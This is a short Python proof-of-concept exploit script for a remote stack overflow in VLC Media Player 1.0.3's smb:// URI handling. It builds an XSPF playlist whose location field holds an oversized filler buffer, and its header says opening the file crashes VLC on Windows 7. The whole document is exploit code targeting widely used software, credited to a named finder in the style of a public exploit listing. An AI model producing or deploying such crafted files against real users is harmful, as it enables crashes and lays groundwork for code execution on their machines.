#!/usr/bin/env python

######################################################################################################
#
# VLC Media Player 1.0.3 smb:// URI Handling Remote Stack Overflow PoC
# Found By:	Dr_IDE
# Tested:	Windows 7
# Download:	http://www.videolan.org
# Note:		Open the .xspf file. It looks like nothing happens but close VLC you will get a crash
#
######################################################################################################

header1 =  ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
header1 += ("<playlist version=\"1\" xmlns=\"http://xspf.org/ns/0/\" xmlns:vlc=\"http://www.videolan.org/vlc/playlist/ns/0/\">\n")
header1 += ("\t<title>Playlist</title>\n")
header1 += ("\t<trackList>\n")
header1 += ("\t\t<track>\n")
header1 += ("\t\t\t<location>smb://example.com@www.example.com/foo/#{")

payload = ("\x41" * 2 + "\x42" * 4 + "\x43" * 10000)

header2 =  ("}</location>\n");
header2 += ("\t\t\t<extension application=\"http://www.videolan.org/vlc/playlist/0\">\n");
header2 += ("\t\t\t\t<vlc:id>0</vlc:id>\n");
header2 += ("\t\t\t</extension>\n");
header2 += ("\t\t</track>\n");
header2 += ("\t</trackList>\n");
header2 += ("</playlist>\n");